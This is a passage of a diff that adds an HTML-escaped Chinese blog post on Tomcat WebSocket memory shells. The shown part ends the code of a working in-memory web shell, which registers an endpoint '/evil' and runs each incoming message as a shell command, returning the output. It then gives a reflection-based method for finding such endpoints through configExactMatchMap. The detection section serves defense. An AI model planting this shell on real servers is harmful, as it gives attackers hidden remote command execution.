+        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;build&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evil&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/evil&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WsServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;standardContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;attribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+            &lt;span class=&#34;c1&#34;&gt;// System.out.println(&amp;#34;ok!&amp;#34;);
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeploymentException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RuntimeException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onMessage&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getProperty&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;os.name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toLowerCase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startsWith&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;windows&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iswin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
+            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRuntime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;message&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;});&lt;/span&gt;
+            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+            &lt;span class=&#34;n&#34;&gt;InputStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getInputStream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StringBuilder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+
+            &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+            &lt;span class=&#34;n&#34;&gt;ips&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;waitFor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getBasicRemote&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sendText&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sb&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;nd&#34;&gt;@Override&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;onOpen&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;EndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addMessageHandler&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;效果：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202207191826978.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;websocket内存马的检测方法&#34;&gt;WebSocket内存马的检测方法&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/202207200104113.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;addEndpoint之后，可以在wsServerContainer里面有个configExactMatchMap属性里面找到Endpoint&lt;/p&gt;
+&lt;p&gt;只需要想办法拿到这个configExactMatchMap里面的config，然后就可以调用getPath等方法就可以拿到endpoint的各种属性，以此来判别是否为内存马&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;configExactMatchMap&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+
+    &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getConfig&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+
+    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;Iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+
+    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hasNext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+
